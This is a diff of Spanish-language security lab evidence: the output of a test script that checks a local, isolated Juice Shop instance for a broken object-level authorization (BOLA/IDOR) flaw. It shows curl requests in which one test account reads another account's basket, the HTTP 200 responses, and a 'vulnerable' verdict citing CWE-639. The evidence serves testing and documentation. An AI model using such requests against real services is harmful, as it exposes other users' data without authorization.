@@ -1,21 +1,25 @@
 $ security/attacks/run.sh  —  A12 BOLA/IDOR entre dos cuentas (riesgo inherente)
 # Objetivo: http://127.0.0.1:3000  (instancia propia del laboratorio, aislada)
+# Transcripcion LITERAL de evidence/fase-4/bola/ (2026-11-04; tokens redactados)
 
-[+] Cuenta A (victima)  : bola_a_1762286560@juice-sh.op   ->  cesta id 6  (UserId 26)
-[+] Cuenta B (atacante) : bola_b_1762286560@juice-sh.op   ->  cesta id 7  (UserId 27)
+[+] Cuenta A (victima)  : bola_a_1793822559@juice-sh.op   ->  cesta id 6  (UserId 26)
+[+] Cuenta B (atacante) : bola_b_1793822559@juice-sh.op   ->  cesta id 7  (UserId 27)
 
 # B solicita la cesta de A con SU PROPIO token (lectura de objeto de otro propietario)
 $ curl -s -H "Authorization: Bearer <token_de_B>" http://127.0.0.1:3000/rest/basket/6
   HTTP/1.1 200 OK
-  {"status":"success","data":{"id":6,"UserId":26,"Products":[...]}}      <-- cesta de A
+  {"status":"success","data":{"id":6,"coupon":null,"UserId":26,"Products":[]}}   <-- cesta de A
 
 # Control negativo (sanity): B lee su propia cesta
 $ curl -s -H "Authorization: Bearer <token_de_B>" http://127.0.0.1:3000/rest/basket/7
   HTTP/1.1 200 OK
-  {"status":"success","data":{"id":7,"UserId":27,...}}                   <-- cesta de B
+  {"status":"success","data":{"id":7,"coupon":null,"UserId":27,"Products":[]}}   <-- cesta de B
 
 Esperado (si fuera seguro) : 401/403, o solo la cesta propia de B
-Observado                  : HTTP 200 con UserId 26 (!= 27) -> se leyo la cesta de A
+Observado                  : HTTP 200 con UserId 26 (!= 27) -> B leyo el OBJETO cesta de A
 
-[VULNERABLE] A12 BOLA/IDOR   La app no verifica la propiedad del objeto (CWE-639 / OWASP API1:2023)
-   -> evidencia: evidence/fase-4/bola/ (resultado-bola.md, cross-read.json, own-read.json)
+# La cesta esta vacia (Products:[]). El BOLA se prueba por el UserId del objeto devuelto
+# (propietario = A, 26), no por su contenido: B accede a un objeto que no le pertenece.
+
+[VULNERABLE] A12 BOLA/IDOR   La app no verifica la propiedad del objeto (CWE-639 / OWASP API1:2023 / A01:2025)
+   -> evidencia literal: evidence/fase-4/bola/ (resultado-bola.md, cross-read.json, own-read.json)
